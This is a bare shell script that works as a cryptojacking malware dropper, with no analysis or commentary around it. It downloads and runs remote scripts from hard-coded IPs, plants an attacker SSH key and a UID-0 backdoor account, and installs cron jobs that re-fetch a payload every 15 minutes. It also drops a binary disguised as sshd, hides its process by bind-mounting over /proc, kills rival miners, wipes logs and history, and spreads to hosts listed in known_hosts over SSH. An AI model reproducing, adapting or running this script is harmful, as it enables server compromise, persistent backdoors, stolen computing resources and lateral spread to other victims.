#!/bin/sh

firewall-cmd --add-port=9000/tcp --permanent
firewall-cmd --add-port=3344/tcp --permanent
firewall-cmd --add-port=1982/tcp --permanent
firewall-cmd --add-port=80/tcp --permanent
firewall-cmd --reload

service iptables stop

curl http://116.62.122.90/init/DUALINSTALLER.sh.txt|sh
curl http://116.62.122.90/init/DUALINSTALLER.sh.txt|bash





function downloadandexec(){
curl -fsSL $1 |bash 2>/dev/null
curl -fsSL $1 |sh 2>/dev/null
wget $1 -O /tmp/.null 2>/dev/null
wge $1 -O /tmp/.null 2>/dev/null
rm -f /tmp/.null 2>/dev/null
}



HISTFILE=/dev/null

crontab -r 2>/dev/null
echo " " > /etc/crontab 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
mkdir -p /var/spool/cron/crontabs 2>/dev/null
rm -f /etc/cron.d/ -R 2>/dev/null
mkdir /etc/cron.d/ 2>/dev/null
rm -f /var/spool/mail/root 2>/dev/null
pkill -f /tmp/


uname -a
id
hostname
setenforce 0 2>/dev/null
ulimit -n 50000
ulimit -u 50000
rtdir="/etc/sysupdates"
miner_url="http://3.215.110.66/src/xmin"
miner_url_backup="http://125.254.128.200/xmin"
miner_size="1093392"
#daemon_url="http://3.215.110.66/src/bioset"
#daemon_url_backup="http://3.215.110.66/src/bioset"
#daemon__size="3693784"
config_url="http://3.215.110.66/src/config.json"
config_url_backup="http://125.254.128.200/config.json"
config_size="2135"
crontab -r 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
mkdir -p /var/spool/cron/crontabs 2>/dev/null
mkdir -p /root/.ssh 2>/dev/null
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIzB9hz7bNT6qtQKCMcitaaxEB9RyJEZuumE+gUMrh6hg3ccSMg9qnAlS/Lmw5SwwLJQXMB5WuhclPJsVawuP+pfsm1ZiGF2JnczEW5kBw1o5Fl/6WOV1p9MOaXHAbpi7o/5Zauu3lTktyIWuP5R9l/2pUWcFZInnaiOr1KNtCBPisNYbZ4FWAQVGwXzUWZ/ZE7SYIoOUm3EJihPPiTulegUmIzc7TzrnEn9M3U8K+LVFye+wDeSC3WNYwfjGQJA4aFsANOiz89olh77G7IaDR8LghNfVVkRjaJ6onDZwb2CZWSivkFsdYtL6690S407eqoes7wkJudo9Qxsn9wxNv HildeGard' > /root/.ssh/authorized_keys
echo '*/15 * * * * curl -fsSL http://116.62.122.90/sh.sh/ash.sh|sh' > /var/spool/cron/root
echo '*/15 * * * * curl -fsSL http://116.62.122.90/sh.sh/ash.sh|sh' > /var/spool/cron/crontabs/root
echo "*/15 * * * * curl -fsSL http://116.62.122.90/sh.sh/ash.sh|sh" | crontab -

useradd -p /BnKiPmXA2eAQ -G root hilde 2>/dev/null
usermod -o -u 0 -g 0 hilde 2>/dev/null

apt-get install -y libhwloc5 libhwloc-dev


mkdir /bin/bin/ 2>/dev/null
if [ `getconf LONG_BIT` = "64" ]
then
wget http://116.62.122.90/load/bin/hole64 -O /bin/bin/sshd 2>/dev/null
else
wget http://116.62.122.90/load/bin/hole32 -O /bin/bin/sshd 2>/dev/null
fi
chmod +x /bin/bin/sshd
chattr +i /bin/bin/sshd
/bin/bin/sshd

mount -t proc none /proc

ratpid=`pidof /bin/bin/sshd`
mkdir /usr/foo
cp /etc/mtab /usr/t
mount --bind /usr/foo /proc/$ratpid
mv /usr/t /etc/mtab


cur -fsSL http://116.62.122.90/sh.sh/iplog.php 2>/dev/null
curl -fsSL http://116.62.122.90/sh.sh/iplog.php 2>/dev/null
wget http://116.62.122.90/sh.sh/iplog.php -O /tmp/.null 2>/dev/null
wge http://116.62.122.90/sh.sh/iplog.php -O /tmp/.null 2>/dev/null
rm -f /tmp/.null 2>/dev/null


echo 128 > /proc/sys/vm/nr_hugepages
sysctl -w vm.nr_hugepages=128


kill_miner_proc()
{
    ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
    ps ax|grep -o './[0-9]* -c'| xargs pkill -f
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f systemctI
    pkill -f WmiPrwSe
}



kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "ash.sh|bsh.sh|sysupdate|rsh.sh"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "ash.sh|bsh.sh|sysupdate|rsh.sh"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}

kill_miner_proc
kill_sus_proc



curl -fsSL http://116.62.122.90/init/spread_installer.sh|sh
#curl -fsSL http://36.7.154.124/as/ssh.sh | bash


iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -I INPUT -s 122.51.164.83 -j DROP
service iptables reload
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
yum install -y bash 2>/dev/null
apt install -y bash 2>/dev/null
apt-get install -y bash 2>/dev/null
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://116.62.122.90/sh.sh/bsh.sh | bash >/dev/null 2>&1 &' & done
fi
bash -c 'curl -fsSL http://116.62.122.90/sh.sh/bsh.sh|bash' 2>/dev/null
